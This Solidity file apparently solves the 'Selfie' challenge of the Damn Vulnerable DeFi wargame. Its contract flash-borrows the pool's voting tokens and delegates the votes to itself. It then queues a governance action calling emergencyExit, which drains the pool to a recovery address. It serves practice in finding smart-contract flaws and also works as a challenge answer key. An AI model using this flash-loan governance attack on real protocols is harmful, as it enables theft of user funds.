//SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
import {IERC3156FlashLender} from "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";

contract FlashBorrower is IERC3156FlashBorrower {

    SelfiePool public pool;
    SimpleGovernance public governance;
    DamnValuableVotes public token;
    address public recovery;
    constructor(address _pool, address _governance, address _token, address _recovery){
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        token = DamnValuableVotes(_token);
        recovery = _recovery;
    }

    function onFlashLoan(
        address initiator, 
        address, 
        uint256 amount, 
        uint256, 
        bytes calldata
    ) external override returns (bytes32){

        token.delegate(address(this));
        require(msg.sender == address(pool), "Untrusted pool");
        require(initiator == address(this), "Untrusted initiator");

        token.balanceOf(address(this));

        governance.queueAction(
            address(pool), 
            0, 
            abi.encodeWithSignature("emergencyExit(address)", address(recovery))
        );

        token.approve(address(pool), amount);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");   // return magic value as per ERC3156
    }

    function executeAction(uint256 actionId) external {
        governance.executeAction(actionId);
    }

    function executeFlashLoan(address _token, uint256 _amount) external {
        pool.flashLoan(this, _token, _amount, "");
    }

}